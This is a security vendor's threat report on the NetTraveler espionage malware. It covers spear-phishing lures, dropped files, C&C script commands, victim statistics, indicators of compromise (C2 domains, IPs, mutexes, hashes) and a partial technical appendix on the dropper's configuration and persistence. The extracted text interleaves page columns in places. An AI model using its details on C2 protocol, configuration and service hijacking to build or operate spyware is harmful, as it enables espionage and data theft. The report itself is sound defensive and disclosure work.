The NetTraveler
(aka ‘Travnet’)
Author Global Research and Analysis Team

The NetTraveler

The NetTraveler
Part 1 (public):
>>Executive summary
>>Attack analysis
>>C&C infrastructure
>>Statistics
>>Mitigation
>>Conclusions

Part 2 (contact us for more information:
intelreports@kaspersky.com):
>>Victim analysis and profiles
>>Command and Control (C&C) infrastructure
and operation
>>Attribution information

2

1. Executive Summary

1. Executive Summary
This report describes multiple cyber-espionage
campaigns that have successfully compromised more than 350 high profile victims in 40
countries. The focus of the paper is to describe
NetTraveler, which is the main tool used by the
threat actors during these attacks.
The name “NetTraveler” comes from an internal
string which is present in early versions of the

servers, we observed how the attackers de-

malware: “NetTraveler Is Running!”. This mal-

ployed different backdoors to the victims’ ma-

ware is used by APT actors for basic surveillance

chines. These include the malware known as

of their victims. Earliest known samples have a

“Saker” also known as “Xbox” (known filenames:

timestamp of 2005, although references exist

“update.exe”, “updata.exe” or “xbox.exe”) and

indicating activity as early as 2004. The largest

“PCRat” / ”Zegost”. This report includes a full

number of samples we observed were created

description of the “Saker/Xbox” backdoor as

between 2010 and 2013.

well.

Known targets of NetTraveler (also known as

The attacks use spear-phishing e-mails with

‘Travnet’ or “Netfile”) include Tibetan/Uyghur

malicious Microsoft Office documents as attach-

activists, oil industry companies, scientific re-

ments. Gathered data includes file system list-

search centers and institutes, universities,

ings, keylogs, various types of documents (.doc,

private companies, governments and govern-

.xls, .ppt, .pdf, etc...) and other private informa-

mental institutions, embassies and military con-

tion. We have calculated the amount of stolen

tractors.

data stored on C&C servers to be 22+ gigabytes.
However this data represents only a small frac-

The NetTraveler backdoor is often used together

tion which we managed to see - the rest of the

with other malware families. During the anal-

it had been previously downloaded and deleted

ysis of one of the command and control (C&C)

from the C&C servers by the attackers.

3

The NetTraveler

2. Attack analysis
NetTraveler victims get infected through spear-phishing attacks using Office documents
which exploit two publicly known vulnerabilities -- CVE-2012-0158 and CVE-2010-3333.
Although these vulnerabilities have been patched by Microsoft, they remain effective and
are among the most exploited in targeted attacks.
During our analysis, we did not see any advanced use of zero-day vulnerabilities or other
malware techniques such as rootkits. It is therefore surprising to observe that such unsophisticated attacks can still be successful with high profile targets.

2.1 Point of entry: spear-phishing examples
We are listing below several NetTraveler spear-phishing examples observed during the
course of this investigation
MD5

29a420e52b56bfadf9f0701318524bef

Create date (GMT)

2011-04-27 10:10:00

Size

274,291

Vulnerability Targeted

CVE-2010-3333

This spear-phish targeted CVE-2010-3333,

that the target in India received this file titled

a very popular vulnerability exploited in many

“Army Cyber Security Policy 2013.doc”, and

attacks. The development of this version of

the accompanying benign and empty decoy

the exploit delivers a large, easily identified

Word document is dropped to the temp folder

“0x4141” NOP sled prior to its shellcode, shed-

and opened with Word as “Jallianwala Bagh

ding some light on the immaturity of the devel-

massacre a deeply shameful act.doc” (MD5:

opment behind the effort. More interesting is

e617348b8947f28e2a280dd93c75a6ad).

4

2. Attack analysis

Kaspersky Lab verdict: Exploit.MSWord.

>>%temp%\perf2012.ini

CVE-2010-3333.cl

>>%temp%\enumfs.ini
>>%temp%\dnlist.ini

The exploit drops

>>%temp%\sysinfo2012.dll

>>%temp%\netmgr.dll

>>%temp%\winlogin.exe

>>%temp%\netmgr.exe
>>%temp%\perf2012.ini
>>%temp%\sysinfo2012.dll
>>%temp%\winlogin.exe
The malware command and control server
script is at “hxxp://www.faceboak.net/2012nt/

MD5

6eb5932b0ed20f11f1a
887bcfbdde10f

Create date (GMT)

2011-04-27 10:10:00

Size

274,291

Vulnerability
Targeted

CVE-2010-3333

nettraveler.asp”.
Filename: “Report - Asia Defense Spending
Boom.doc”
MD5

b600089a93275fa935
58695b707b87ad

Decoy filename: “Report--Asia Defense Spend-

Create date (GMT)

2011-04-27 10:10:00

Size

274,291

8947f28e2a280dd93c75a6ad)

Vulnerability
Targeted

CVE-2010-3333

ing Boom.doc” (empty) (MD5: e617348b-

Kaspersky Lab verdict: Exploit.MSWord.
CVE-2010-3333.cl

Filename: “invitation.doc”
Decoy filename: “mailnew.doc” (empty)

Drops:

Kaspersky Lab verdict: Exploit.MSWord.

>>%windir%\system\config_t.dat

CVE-2010-3333.cl

>>%windir%\system32\enumfs.ini

Drops:

>>%windir%\system32\dnlist.ini

>>%temp%\netmgr.dll

>>%windir%\system32\Iasex.dll

>>%temp%\netmgr.exe

>>%windir%\system32\system_t.dll

5

The NetTraveler

MD5

917e36946c67414a988f6
878d9d0cdfe

Create date (GMT)

2011-04-27 10:10:00

Size

252,275

Vulnerability
Targeted

CVE-2010-3333

E-mail spear-phishing sample entitled “His Holiness the Dalai Lama’s visit to Switzerland day 4”.

Attachment filename: “His Holiness the Dalai

Multiple decoy images depicting a large Tibetan
audience, and the Dalai Lama speaking

Drops:

Lama’s visit to Switzerland Day 3.doc”

>>%AppData%\Adobe\netmgr.dll

Decoy filename: “His Holiness the Dalai Lama’s

>>%AppData%\Adobe\netmgr.exe

visit to Switzerland Day 3.doc”

>>%AppData%\Adobe\perf2012.ini
>>%AppData%\Adobe\sysinfo2012.dll

Kaspersky Lab verdicts: Exploit.MSWord.

>>%AppData%\Adobe\enumfs.ini

CVE-2010-3333.ci

>>%temp%\winlogin.exe

6

2. Attack analysis

MD5

36ed86602661bb3a7a5
5e69fde90ee73

Create date (GMT)

2011-04-27 10:10:00

Size

252,275

Vulnerability
Targeted

CVE-2010-3333

Kaspersky Lab verdict: Exploit.MSWord.CVE2010-3333.ci
Drops:
>>%AppData%\Adobe\netmgr.dll
>>%AppData%\Adobe\netmgr.exe

Filename: “BJP won’t dump Modi for Nitish NDA

>>%AppData%\Adobe\perf2012.ini

headed for split.doc”

>>%AppData%\Adobe\sysinfo2012.dll

Decoy filename: “BJP won’t dump Modi for Nitish

>>%AppData%\Adobe\enumfs.ini

NDA headed for split.doc”

>>%temp%\winlogin.exe

Decoy document with text related to politics in India.

7

The NetTraveler

MD5

059a7482efee3b2abf67c
12d210cb2f7

MD5

151e5d1bb8142835633
cfd398e2e0ca3

Create date (GMT)

2011-04-27 10:10:00

Create date (GMT)

2011-04-27 10:10:00

Size

225,139

Size

225,139

Vulnerability
Targeted

CVE-2010-3333

Vulnerability
Targeted

CVE-2010-3333

Filename: “Activity Details.doc”

Filename: “The Prayer.doc”

Decoy filename: “Activity Details.doc” (empty)

Decoy filename: “Freedom of Speech.doc” (empty)

Kaspersky Lab verdict: Exploit.MSWord.CVE-

Kaspersky Lab verdict: Exploit.MSWord.CVE-

2010-3333.ci

2010-3333.ci

Drops:

Drops

>>%AppData%\Adobe\netmgr.dll

>>%AppData%\Adobe\netmgr.dll

>>%AppData%\Adobe\netmgr.exe

>>%AppData%\Adobe\netmgr.exe

>>%AppData%\Adobe\perf2012.ini

>>%AppData%\Adobe\ie.log

>>%temp%\winlogin.exe files.

>>%AppData%\Adobe\perf2012.ini
>>%temp%\winlogin.exe

MD5

63494c74db9bfc2bba
3983698c952de9

MD5

f4f14d4a1e34f62eeb9
a90b5c8b2cfc1

Create date (GMT)

2011-04-27 10:10:00

Create date (GMT)

2011-04-27 10:10:00

Size

234,355

Size

225,139

CVE-2010-3333

Vulnerability
Targeted

CVE-2010-3333

Vulnerability
Targeted

Filename: “23948-report.doc”
Filename: “Fax13-0417.doc”

Decoy filename: “Report.doc” (empty)

Decoy filename: “Fax13-0417.doc” (empty)

Kaspersky Lab verdict: Exploit.MSWord.CVE-

Kaspersky Lab verdict: Exploit.MSWord.CVE-

2010-3333.ci

2010-3333.ci

Drops

Drops
>>%AppData%\Adobe\netmgr.dll

>>%AppData%\Adobe\netmgr.exe

>>%AppData%\Adobe\netmgr.exe

>>%AppData%\Adobe\enumfs.ini

>>%AppData%\Adobe\perf2012.ini

>>%AppData%\Adobe\perf2012.ini

>>%AppData%\Adobe\sysinfo2012.dll

>>%temp%\winlogin.exe

>>%AppData%\Adobe\enumfs.ini
>>%temp%\winlogin.exe

8

>>%AppData%\Adobe\netmgr.dll

2. Attack analysis

MD5

e5954b8204eb321d
20bed4a86b3cef34

Create date (GMT)

MD5

0e2b10015fe52b7ea77
a213f0c330557

Create date (GMT)

2012-06-29 08:31:45

Size

414,703

Size

222,208

Vulnerability
Targeted

CVE-2010-3333

Vulnerability
Targeted

CVE-2012-0158

Filename: “Alban Tushaal Jagsaalt.doc”

Filename: “data.xls” (empty decoy)

Decoy filename: “document.doc” (Mongolian

Kaspersky Lab verdict: Exploit.Win32.CVE-

text)

2012-0158.y

Kaspersky Lab verdict: Exploit.MSWord.CVE-

Drops:

2010-3333.ci

>>%temp%\enumfs.ini

Drops

>>%temp%\sysinfo2012.dll

>>%temp%\smcs.exe

>>%temp%\dnlist.ini

>>%windir%\system\config_t.dat

>>%temp%\netmgr.dll

>>%windir%\system32\6to4ex.dll

>>%temp%\perf2012.ini

>>%windir%\system32\svchost.log

>>%temp%\netmgr.exe

Decoy document with Mongolian writing

9

The NetTraveler

2.3 Installed malware, functionalit y,
persistence
NetTraveler is an automatic data exfiltration tool, designed to extract large amounts
of private information from the victim’s system over long periods of time. The malware
uses compression techniques and a fail-safe protocol to ensure that uploaded data is
safely transferred to the attacker’s C2s.
By default, NetTraveler exfiltrates common file

It is clear that the attackers are also collecting

types such as DOC, XLS, PPT, RTF and PDF. For

files of type “.cdr” (Corel Draw designs), “.dwg”,

a full list, see the detailed backdoor analysis

“.dxf”, “.cdw”, “.dwf” (AutoCAD projects) and

below. The backdoor configuration can however

some configuration files “.cfn” and “.cfg”.

be extended with special options to steal other
file types. Here’s one such extended configura-

The various parameters of the malware are con-

tion recovered from an attack against a victim

figured with a builder, which allows the attackers

working in the oil industry:

to change things such as the list of stolen files
extensions, C2 address and so on:

10

2. Attack analysis

NetTraveler configuration GUI

2.4 Exfiltrated data
Exfiltrated data is encoded with a custom compression and encoding library, which produces files which resemble BASE64. The data is transferred to the command and control
servers via HTTP requests such as:

11

The NetTraveler

2.5 Overlap with Red
October

2.6 Connections with
other campaigns

Note: for our analysis of the Red October cam-

To better identify core NetTraveler actors and

paign, see: https://www.securelist.com/en/

delineate the groups from one another, we

blog/785/The_Red_October_Campaign_An_

collect and categorize various Tactics, Tech-

Advanced_Cyber_Espionage_Network_Target-

niques, and Procedures (TTPs) employed by

ing_Diplomatic_and_Government_Agencies

these adversaries throughout their operations.
The attacker’s IP operation ranges, overlaps

During our analysis of NetTraveler infections,

with that of a malware family known as “Ze-

we identified several victims that were infected

gost”. For instance, one of the command and

both by NetTraveler and Red October. Although

control servers that is part of the infrastruc-

we see no direct links between the NetTraveler

ture, is a well-known C2 for multiple Zegost

attackers and the Red October threat actor, the

variants, still active as of May 2013. The tar-

existence of victims infected by both of these

gets and command and control domain naming

campaigns is interesting.

scheme indicates a connection between the
Lurid/Enfal attackers and NetTraveler. Some

These victims are:

of the NetTraveler C2’s are used to distribute

>>A Military Contractor in Russia

a malware known as “Saker” or “Xbox”, which

>>An Embassy in Iran

is delivered as an “update” to the NetTraveler

>>An Embassy in Belgium

victims.

>>An Embassy in Kazakhstan
>>An Embassy in Belarus

Note: more details about the connections

>>A Government entity in Tajikistan

between NetTraveler and other campaigns

These infections indicate that certain high profile

is available in our private report. Contact

victims are targeted by multiple threat actors;

us at intelreports@kaspersky.com for more

the target information is a valuable commodity.

details.

12

3. Command and control servers and infrastructure

3. Command and control
servers and infrastructure
During our monitoring period, we observed more than 100 command and control URLs,
pointing to multiple servers in the United States, China and Hong Kong.
The command and control servers generally run
IIS 6/7, as the C2 backend is an ASP (Microsoft

aasogspread.asp, adfsdfclnggsldfc.asp,

Active Server Pages) script.

advertisingservicesa3sb.asp, aney wsf.
a s p, a p p l e . a s p, a p p l e b a g 0 0 5 . a s p,

To transfer stolen data from the command and

azarweforrell.asp, azofjeljgo648rl.asp,

control servers, the attackers use FTP on top

certify.asp, dochunter.asp, dochunter1.asp,

of VPN connections through a server in the US

dochunteradfaefaer.asp, fish.asp, happy.

hosted by Krypt Technologies. The infrastructure

asp, heritage.asp, huyuio67.asp, little.asp,

is secured by allowing FTP access only to remote

madmaswhbe.asp, nethttpfile.asp, netpass.

users coming from predefined IPs, including the

asp, nettraveler.asp, orphaned.asp, rice.asp,

VPN provider in the US.

sabcfsf.asp, shenghai.asp, time.asp, update.
asp, weathobloe.asp, yegnfvhemc.asp

During our investigation, we analyzed several
hundred NetTraveler samples and configuration
files, which use more than 30 different C&C serv-

All the known command and control servers per-

ers. The list below includes the script names that

form the same basic functions - for a description

we have seen on these servers and confirmed

of the supported functionality, see below.

as malicious:

13

The NetTraveler

14

3. Command and control servers and infrastructure

3.1 Description of C2 script functionalit y
The main function of Command and Control servers is to collect stolen data from the
victims. Stolen data is stored in the exact format it was sent from the victim’s PC, without
any additional encoding or obfuscation.
Here’s a listing of how a folder storing stolen victim data could look on the C&C server:

The uploaded data can be either a document file, a keylogger backlog or a system information profile. Here’s how a decoded system information profile looks like:

15

The NetTraveler

System profile, filename is of the form ‘@@@dll@@@travlerbackinfo-[date/time].bak’

The system profile includes an IPCONFIG output as well as a list of user accounts in the
machine. If the malware install includes the “NetPass” module, a keylogger will silently
collect all typed data, together with window names. This produces logs like the following
(in decoded format):

Sample decrypted log from the keylogging module

16

3. Command and control servers and infrastructure

The command and control scripts implement several functions to communicate with the
victim; during our analysis, we observed four different generations of these scripts, with
various degrees of complexity. The main function of the C&C script saves stolen data to
a folder in the C2 root, unless the request variable “action” is defined, in which case, it
performs one of the following commands:
Command
“action”)

Purpose

Script
generation

getdata

Read list of commands from the configuration file (eg. “nettraveler.
txt”) and send it to the victim. Commands can be “UNINSTALL”,
“RESET”, “UPDATE”, “UPLOAD”. For a description of these commands see the technical appendix.

nettraveler.asp

updated

Report to the C2 a successful exfiltration of victim’s data.

nettraveler.asp

getemail

Read a template file (eg. “email.eml”) and send to victim

nettraveler.asp

gotemail

Delete template from C2 (“email.eml”)

nettraveler.asp

datasize

Report filesize of additional backdoor module (eg. “updata.exe”)

nettraveler.asp

getcmd

Get specific individual commands to be executed on the victim’s
machine.

nettraveler.asp

gotcmd

Delete specific individual command for the victim from the C2

nettraveler.asp

gettext

Send a specific text file from the C2 to the victim (eg. “nethttpfile.
txt”)

happy.asp

downloaded

Same as “updated” command

happy.asp

downloadsize,
updatesize

Same as datasize

happy.a

The Command and control scripts reply to the

Under normal operation, a victim can connect

victim with either “Success:<size>” or “Fail!”, de-

to the C2 every five seconds and upload chunks

pending on the result of the operation. In some

of data from the victim, until the entire file is

cases, instead of the “Fail” string, a more de-

successfully transferred. In case of errors, the

tailed error is sent back to the victim, in Simpli-

malware continues to send the data over and

fied Chinese:

over, until they succeed.

“无法删除!” - means “Can not be deleted!”
“该文件不存在!” - means “The file does not exist!”

17

The NetTraveler

4. Global infection statistics
During our analysis, we obtained infection logs from several command and control
servers. The logs, which go back as far as 2009, show that the threat actors behind
NetTraveler successfully infected more than 350 victims in 40 countries. The following
map shows the locations and profile of the victims:

18

4. global infection statistics

The following map lists the victim profiles by industries:
Press 1%

Diplomatic 32%

IT 3%
Financial 3%
Health 2%
Activism 3%

Research 4%

Airspace 6%

Government 19%
Industrial and
Infrastructure 7%

Military 9%

Private 11%

Note: chart does not include the victims that couldn’t be identified

In addition to the data from the Command and

Besides the C&C logs and KSN, we have also

Control servers, we collected statistics regarding

sinkholed two of the C&C domains used by

detections of NetTraveler from the Kaspersky

NetTraveler:

Security Network. The top 10 infected coun-

>> pkspring.net

tries as reported in KSN (Kaspersky Security

>>yangdex.org

Network):
Position

Country

% of total

The data set collected so far from the sinkhole
is relatively small and includes victims in Mon-

1

Mongolia

29%

2

Russia

19%

3

India

11%

4

Kazakhstan

11%

date this paper with more data as it becomes

5

Kyrgyzstan

5%

available.

6

China

3%

7

Tajikistan

3%

Note: Taking into account that several other C&C

8

South Korea

2%

servers exist for which we have no logs and the KSN

9

Spain

2%

coverage, we estimate the total number of victims

10

Germany

1%

worldwide to be around ~1,000.

golia, South Korea and India. We will continue
to monitor the connections and over time, up-

19

The NetTraveler

5. Mitigation information
From the point of view of the victims, the most

>>213.156.6.122 - C2 (cultureacess.com)

important part of any report is information on

>>209.130.115.38 - C2 (tsgoogoo.net)

how to detect and eradicate the infections. In

>>98.143.145.80 - C2 (spit113.minidns.

addition to running a modern security suite capable of detecting NetTraveler, things such as
filenames or C2 IPs can be extremely useful to
system administrators.

net)
>>96.46.4.237 - C2 (sghrhd.190.20081.
info)
>>109.169.86.178 - C2 (imapupdate.com)
>>125.67.89.156 - C2 (faceboak.net)

This part of the report includes:

>>142.4.96.6 - C2 (buynewes.com)

>>Indicators of compromise

>>124.115.21.209 - C2 IP

>>Kaspersky detection names

>>67.198.140.148 - C2 (southstock.net)

>>MD5s of known samples

>>9 6.4 4.179. 26 - C 2 (vip222idc.
s169.288idc.com)
>>235.22.123.90 - C2 (gami1.com)
>>178.77.45.32 - C2 (ra1nru.com)

5.1 Indicators of
compromise:

Command and control domains and server
names:
>>allen.w223.west263.cn

T y pes of IOC s:

network traffic / IPs
>>209.11.241.144 - mothership, VPN server, C2
>>121.12.124.69 - C2 (allen.w223.
west263.cn)

>>andriodphone.net
>>bauer.8866.org
>>buynewes.com
>>cultureacess.com
>>discoverypeace.org
>>drag2008.com

>>61.178.77.111 - C2 (wolf0.3322.org)

>>eaglesey.com

>>182.50.130.68 - C2 (viprambler.com)

>>enterairment.net

>>103.20.192.59 - C2 (sunshine.59.ydli.net)

>>faceboak.net

20

5. Mitigation information

>>gami1.com

>>Main active group(s) in 2013, unique

>>globalmailru.com

configuration filenames: perf2012.

>>hint09.9966.org

ini, config_t.dat, config_shenghai.dat,

>>imapupdate.com

pert2012.ini, in:

>>inwpvpn.com

• C:\Documents and Settings\[user]\

>>keyboardhk.com

Local Settings\Temp\

>>localgroupnet.com

• C:\Users\[user]\Local Settings\Temp\

>>mailyandexru.com

• C:\WINDOWS\Temp\

>>msnnewes.com

• C:\WINDOWS\system\

>>newesyahoo.com
>>newfax.net
>>pkspring.net - sinkholed by Kaspersky
Lab

>>Other (older) variants, configs: FMIFEN.INI
in:
• %System%
>>Malware body: net.exe, netmgr.exe, net

>>ra1nru.com

mgr.dll in

>>ramb1er.com

• C:\

>>sghrhd.190.20081.info

• C:\WINDOWS\system\

>>southstock.net

• %system%

>>spit113.minidns.net

• %temp%

>>tsgoogoo.net

• C:\WINDOWS\Temp\

>>vip222idc.s169.288idc.com
>>viplenta.com

• %appdata%\Adobe\
>>Other (older) variants, malware bodies:

>>vipmailru.com

• %System%\bootuid.dll

>>viprainru.com

• %System%\wuaucit.exe

>>viprambler.com

• %System%\6to4ex.dll

>>vipyandex.com

• %temp%\Process.dll

>>vpnwork.3322.org

• %temp%\Process.dll_d

>>wolf0.3322.org

• %temp%\cmss.exe

>>wolf001.us109.eoidc.net

• %temp%\sysinfo2012.dll

>>yahooair.com

• %temp%\winlogin.exe

>>yangdex.org - sinkholed by Kaspersky

• %windir%\system32\Iasex.dll

Lab
>>zeroicelee.com
Malware file names on disk:

• %windir%\system32\system_t.dll
• %temp%\smcs.exe
• %appdata%\Adobe\sysinfo2012.dll

21

The NetTraveler

>>Artifacts during installation and running:
• %Temp%\Win32en.baT
• %System%\dnlist.ini

5.2 Malware names by
Kaspersky products

• %temp%\dnlist.ini
• %appdata%\Adobe\ie.log

Detection names for the malware modules and

• %temp%\ie.log

related files:

• %System%\enumfs.ini

>>Backdoor.Win32.Bifrose.bcx

• %temp%\enumfs.ini

>>Trojan-Dropper.Win32.Dorifel.acrn

• %System%\install.tmp

>>Trojan-Dropper.Win32.Dorifel.acsj

• %System%\kyrecord.txt

>>Trojan-Dropper.Win32.Dorifel.acsm

• C:\Documents and Settings\<USER>\

>>Trojan-Dropper.Win32.Dorifel.acuf

Start Menu\Programs\Startup\seru-

>>Trojan-Dropper.Win32.Dorifel.cql

vice.lnk

>>Trojan-Dropper.Win32.Dorifel.fhg

• C:\Documents and Settings\<USER>\

>>Trojan-Dropper.Win32.Dorifel.fny

Start Menu\Programs\Startup\net-

>>Trojan-Dropper.Win32.Dorifel.iat

mgr.lnk

>>Trojan-Dropper.Win32.Dorifel.jam

• C :\ DOCUME~1\< USER > ~1\ LO

>>Trojan-Dropper.Win32.Dorifel.kcy

CALS~1\Temp\RECYCLER_w\AllIndex.

>>Trojan-Dropper.Win32.Dorifel.ylt

ini

>>Trojan-Spy.Win32.TravNet.*

• C :\ DOCUME~1\< USER > ~1\ LO

>>Trojan.Multi.Yahg.a

CALS~1\Temp\RECYCLER_w\AllIndex.

>>Trojan.Win32.Agent2.eakj

ini_d

>>Trojan.Win32.Agent2.exms
>>Trojan.Win32.Agent2.ezgb

Mutexes created during backdoor operation:

>>Trojan.Win32.Agent2.fdhs

>>Boat-12 Is Running!

>>Trojan.Win32.Delf.dgmw

>>DocHunter2012 Is Running!

>>Trojan.Win32.Delf.dgmx

>>Hunter-2012 Is Running!

>>Trojan.Win32.Genome.agyil

>>NT-2012 Is Running!

>>Trojan.Win32.Genome.aiunu

>>NetTravler Is Running!

>>Trojan.Win32.Genome.ajeqr

>>NetTravler2012 Is Running!

>>Trojan.Win32.Genome.akqco

>>SH-2011 Is Running!

>>Trojan.Win32.Genome.aksho

>>ShengHai Is Running!

>>Trojan.Win32.Jorik.TravNet.*
>>not-a-virus:Downloader.Win32.NetTrav
eler.*

22

5. Mitigation information

Kaspersky detection names for malicious

1a70e1e36e6afa454f6457140ac3d2ec

documents with embedded exploits used in

1dcad7c8f56207b2c423353f0c328755

spear-phishing attacks:

1f26e5f9b44c28b37b6cd13283838366

>>Exploit.MSWord.CVE-2010-3333.cg

209c3b51cad30c85ca79a9f067ce04cd

>>Exploit.MSWord.CVE-2010-3333.ci

22be9cca6e4ec3af327595b890a92fec

>>Exploit.MSWord.CVE-2010-3333.cl

28e9faec9de3bbdeb65435bfc377d1f8

>>Exploit.Win32.CVE-2012-0158.y

294da087e6329ae78c1a5fb42b999500

>>Exploit.MSWord.CVE-2012-0158.an

29a394a4ec8a30b5f36c7b874fc9fe10

>>Exploit.MSWord.CVE-2012-0158.ax

2a43c23a17cd2bc9074a486c47444e7c

>>Exploit.Win32.CVE-2012-0158.aa

2ac8f77548e87b401767c7076adfa00d
2d0e4748d857c12184ed2c94c13ec1ae
2dc139d82a2a5bf027bcb6a40f75b3f4
33334d8dc36c4ee7739fe2f8b448da72

5.3 MD5s of malicious files

36f9a0e71f0b580333c61bfeaa88df39
37d588b289c65f10c256e43eba939a0a
382c1d692dd3cec9b046e5c0eeaf92e6

Spear-phishing samples MD5s:

39c2b2ee24373bf1ef20faff958718bc

36ed86602661bb3a7a55e69fde90ee73

3b4cf5f1ff8c4187e41c6ab80f000491

6eb5932b0ed20f11f1a887bcfbdde10f

3cb96fe79aa01c82ac68c54e88918e57

059a7482efee3b2abf67c12d210cb2f7

482f112cb7cb0293d99f8a7606acbe85

e5954b8204eb321d20bed4a86b3cef34

4968882f189236952fd38a11586b395a

63494c74db9bfc2bba3983698c952de9

4c8950da250ea135ee77a2644af414ba

b600089a93275fa93558695b707b87ad

524aed944b7f307eea5677eda7e2079a

f4f14d4a1e34f62eeb9a90b5c8b2cfc1

54583ccc97c33e358510b563b1536e69

0e2b10015fe52b7ea77a213f0c330557

57f2374d9f2a787339b0c6a5b1008a72

29a420e52b56bfadf9f0701318524bef

5e35b31472a2e603a995198d8e8411ed
5e7c5e8d9f5864488ddf04b662d1ad8e
63f0f91e3ccf5dd00a455d3038a299f4

Malware modules:

66684b8b82fb5318a41ab7e6abb8dd42

01d06f85fce63444c3563fe3bd20c004

677f7c42f79a0a58760056529739fdd6

03e8d330abc77a6a9d635d2e7c0e213a

6afeec03c8f4bc78fa2b3ad27392b0e7

08e5352a2416bd32a1c07f2d6c2f11fa

6d00e4f95fba02126b32bb74dc4fec55

13b3cb819b460591c27e133e93fb8661

6d49cdbade7541d46be3fb47a0f563bb

19a0693480c82f2b7fc8659d8f91717a

6de813a22b2b73e330085ec7c85e041b

23

The NetTraveler

24

71f311a648348e7598eb55ab7618842c

b990752f8266d7648070bea7e24d326f

723129912a2d0fb4aede7100071787ef

ba026e6190aee2c64ef62a4e79419bcf

778c1764dd5c36c1eb96c49a8f8441e6

bea6e3481c0a06ce36600d8b3cc6155b

7b92e9d21bc4db838bc102b289f4fd5f

c87e8a3ceefd93c7e431b753801c6bb6

812d8e4d7a484bb363b139cfa08617e5

cb9cc50b18a7c91cf4a34c624b90db5d

81591ae1c975b8a0b5ad5546a103992c

cebaaad59f1616698dec4f14d76b4c9a

81d92e20f3078bd8e43b226308393e43

d04a7f30c83290b86cac8d762dcc2df5

83429db9cc63196bf42c691cc09b7b84

d218706eb07f2722ae4e0106cce27d52

852f562812305ad099372109f8e8b189

d286c4cdf40e2dae5362eff562bccd3a

85865e048183849b255c92e609a5fa25

d2fe88fff648a0bcbfdf0f0bd042a0a4

86cce64193a347b50329a32cdf08d198

d354b71116961cad955ed11cb938ca32

89bfd463ca76b62c61a548778316567d

d687cfde1c4ea77de1b92ea2f9e90ad5

8ccea94fd83d9cb1b15a2a4befec24a2

d80c29813bfbc3cbcbd469249d49ebf3

8d3036a65ac2404d4562cdb927fd3d2c

d9c0ca95e49b113c5751fffdb20beb3f

8d78a9e3df1e19f9520f2bbb5f04cb54

d9cf41b5d11e42dabf9470964d09c000

8dc61b737990385473dca9bfc826727b

db6e36f962fdb58c8e9f8f9a781fda66

95113e04af14c23df607964fa9d83476

dc01df3c40cb4fb0bef448693475ea1b

9b198f1e260700bdcb4740266cd35b3f

def612ad0554006378f185d3b56efb57

9c1c2825532b25e266d62db50952ab44

e51a4cc0272a98e9eddfec16667603f4

9c544da8c23826379d60581cce17a483

e5b1ffd2ecd7e610d07d093d65639da9

a0e350787e4134ea91ccb26d17cdf167

eb5761c410b5139f23235e9b67964495

a1169fb2eb93616ced7536a53fb05648

eefc66a1e978dc9d825f28702106d4d5

a431d5786d9d95bc9d04df07cbefc0a2

efa23860086c5d12d3e6b918073c717f

a6d89df2a80675980fb3e4a9bcc162e2

f3c5c20f5c45fc401484caf72753d778

a77456a160890a26a8f7c019c2e77021

fad8f37c9bd5420f49cfd5960a60fa24

aa6f8eff83aea3ff7b8f016e67f74dac

fb3495715764cdaa547f2b040c0a9b1f

af6649323daf6dbd3aef1b950588487c

fc3853c2383e2fbb2af381fd1277504d

b3840ec1299517dacd6c18c71ff5bafc

fe16c30782e2b16b07d5a3a1cf9dfb8f

b8c99bc028a0a32288d858df7bf6bec1

ff04126a5d61a10c81bfd0a6d0a643d0

conclusions

Conclusions:
During our analysis, we describe NetTraveler, a

By publishing this report we would like to raise

malicious data exfiltration tool used by a me-

awareness of all organizations and individuals

dium-sized threat actor group from China. The

who might become a victim of these attackers.

main targets of the group include government

We would like to encourage people of all coun-

institutions, embassies, oil and gas industry,

tries to learn something from this report, check

research institutes, universities, private com-

their systems and be prepared for potential fu-

panies, military contractors and activists. The

ture cyberattacks against them.

group’s domains of interest include space exploration, nanotechnology, energy production,

More information on attribution and victims will

nuclear power, lasers, medicine and communi-

be available to selected parties, including lo-

cations between others.

cal authorities of victim countries. For details,
please contact us at intelreports@kaspersky.

Although not very advanced, the NetTtraveler

com.

attackers have successfully compromised hundreds of targets around the world, with the highest number in Mongolia, India and Russia.
The group using NetTraveler is also employing
other malware, including Zegost, Saker and others. To compromise their victims, they rely on
exploits for two popular vulnerabilities in Microsoft Office.
Based on collected intelligence, we estimate the
group size to about 50 individuals, most of which
speak Chinese natively and has knowledge of
English language.

25

The NetTraveler

Appendix A:
Malware technical analysis
The NetTraveler Dropper
MD5

2a43c23a17cd2bc9074a486c47444e7c

Create date (GMT)

2013.02.18 07:54:28

Size

176’640

Linker version

6.0 (MSVC++ 6.0)

Descrip tion

Technical De tails

The module is a Win32 PE executable file com-

Execution of the module starts with the creation

piled in Microsoft Visual C++ 6.0. Its main pur-

of a system mutex object called “INSTALL SER-

pose is to drop a DLL file and register it as a sys-

VICES NOW!”. If this mutex already exists the

tem service. The malware looks up a suitable

module quits to avoid duplicate instances of the

service name from one of the values in the reg-

same module from running.

istry.
After that, the module creates the configuraThis module also drops an INI-type file with the

tion file named %WINDIR%\system\config_t.dat

configuration that is later used by the NetTrav-

which is populated with the strings embedded in

eler backdoor.

the body of the executable and encrypted with
simple one-byte XOR (0x3E).

Encrypted configuration data in the dropper

26

Appendix A: Malware technical analysis

The config_t.dat is an INI-type file which contains

The purpose of PS, PP, PU, PW, PF parameters

the module configuration shown below:

is the following:
>> PS = proxy server address

[Option]

>>PP = proxy server port

WebPage=hXXp://vip222idc.s169.288idc.com/nt12/

>>PU = proxy username

newyork/city/nettraveler.asp2

>>PW = proxy password

DownCmdTime=10

>>PF parameter purpose remains unclear.

UploadRate=128
[Other]

The module then queries registry value at

UP=0

HKLM\SOFTWARE\Microsoft\Windows

[OtherTwo]

NT\\CurrentVersion\Svchost\netsvcs which

AutoCheck=1

is a multi-string type of value. Then it iterates
through the names of services in that value to

The WebPage parameter’s maximum length is

find a special service name. It must not be the

128 bytes and represents a URL for the Com-

“6to4” service and there must not be registry

mand and Control server (C&C). DownCmdTime

key HKLM\SYSTEM\CurrentControlSet\Ser-

is the delay in minutes between requests sent

vices\<servicename>.

to the C&C server.
On Windows XP services that match the deThe code of the function to dump the INI file

scribed criterias are (eg.) “Ias”,”Iprip”, “Irmon”

is designed to process several cases. There is

and a few others. These names are different on

1 byte value for variable UP (which stands for

other Windows OS and even depend on installed

“Use Proxy”) from section [Other]. If that value

features or Service Packs. The malware takes

is set to 1 (absolute file offset 0x334) then the

the first matching service name and uses it.

INI file section [Other] will be populated with the
following values:

Right after that, the malware attempts to delete
%WINDIR%\system32\<servicename>ex.

[Other]

dll and registers a new system service with the

UP=1

same name <servicename>. The service is

PS=<string (max 32 bytes from offset 0x335)>

